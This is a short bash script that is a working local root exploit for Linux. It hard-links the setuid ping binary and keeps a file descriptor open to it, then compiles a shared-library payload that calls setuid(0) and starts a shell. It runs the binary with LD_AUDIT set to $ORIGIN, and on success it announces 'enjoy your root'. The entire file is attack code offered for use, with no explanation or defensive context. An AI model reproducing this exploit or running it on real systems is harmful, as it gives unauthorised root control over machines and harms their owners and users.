#!/bin/bash
echo "Trying to get root"
if [ $# != 1 ]; then
        echo "$0 <writeble dir>"
        exit;
fi

dir=$1
mkdir -p ${dir}/exploit
ln /bin/ping ${dir}/exploit/target
exec 3< ${dir}/exploit/target
ls -l /proc/$$/fd/3
rm -rf ${dir}/exploit/
ls -l /proc/$$/fd/3
cat > payload.c << _EOF
void __attribute__((constructor)) init()
{
   setuid(0);
   system("/bin/bash");
}
_EOF
gcc -w -fPIC -shared -o ${dir}/exploit payload.c
ls -l ${dir}/exploit
LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3
check=`whoami`
if [ "$check" == "root" ]; then
echo "Succeded, enjoy your root"
bash
else
echo "Did not work, better luck next time"
fi

